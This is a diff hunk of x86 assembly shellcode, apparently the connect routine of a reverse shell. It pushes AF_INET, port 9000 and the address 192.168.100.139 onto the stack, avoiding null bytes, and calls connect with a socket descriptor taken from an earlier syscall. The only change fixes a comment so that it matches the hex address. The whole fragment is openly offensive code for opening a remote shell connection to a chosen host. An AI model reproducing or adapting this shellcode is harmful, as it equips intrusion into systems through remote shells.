@@ -23,7 +23,7 @@ connect:
       pop ax                  ; Pops such word into ax so there are no nulls.
       mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
       push edx                ; Pushes 0.
-      push dword 0x8b64a8c0   ; Pushes 192.168.100.200 in hex as a DWORD.
+      push dword 0x8b64a8c0   ; Pushes 192.168.100.139 in hex as a DWORD.
       push word 0x2823        ; Pushes 9000 in hex as a WORD.
       push word 0x02          ; Pushes AF_INET into the stack.
       mov ecx, esp            ; Copies the value of ESP into ECX.
